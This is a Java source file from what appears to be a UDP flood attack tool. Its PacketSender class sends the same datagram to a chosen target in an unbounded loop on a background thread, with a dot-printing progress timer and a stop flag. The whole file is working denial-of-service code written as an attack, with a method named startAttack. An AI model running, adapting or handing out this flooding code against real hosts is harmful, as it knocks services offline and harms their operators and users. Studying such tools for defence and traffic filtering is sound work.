package clwhthr.updfloodattacker.util;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;

public class PacketSender {
	
	private static PacketSender instance = null;
	private DatagramSocket socket = null;
	private volatile DatagramPacket packet = null;
	private volatile boolean canSend = true;
	private PacketSender() throws SocketException {
		socket = new DatagramSocket();
	}
	public static synchronized PacketSender getInstance() {
		try {
			if(instance == null)instance = new PacketSender();
		} catch (SocketException e) {
			// TODO 自動產生的 catch 區塊
			e.printStackTrace();
		}
		return instance;
	}
	
	public synchronized void setPacket(DatagramPacket packet) {
		this.packet = packet;
	}
	synchronized void sendPacket() throws IOException {
		socket.send(packet);
	}
	public void startAttack() {
		Thread attackThread = new Thread(new Runnable() {
			@Override
			public void run() {
				System.out.printf("hostname=%s\n",packet.getAddress().getHostName());
				InetAddress address = packet.getAddress();
				try {
					System.out.printf("sending to %s(%s)\n",address.getHostName(),address.getHostAddress());
					System.out.println("enter \"ctrl + z\" or input \"stop\" to stop attacking.");
					Timer timer = new Timer(1000, new Task() {
						int count = 0;
						@Override
						public void doWork() {
							if(count%50==0) {
								System.out.println();
							}
							count = (++count)%50;
							System.out.print(".");
						}
					});
					timer.start();
					while(canSend()){
						socket.send(packet);
					}
					timer.stop();
				} catch (IOException e) {
					e.printStackTrace();
				}
				
			}
		});
		attackThread.start();
	}
	private synchronized boolean canSend() {
		return canSend;
	}
	
	public synchronized void stop() {
		canSend = false;
	}
}
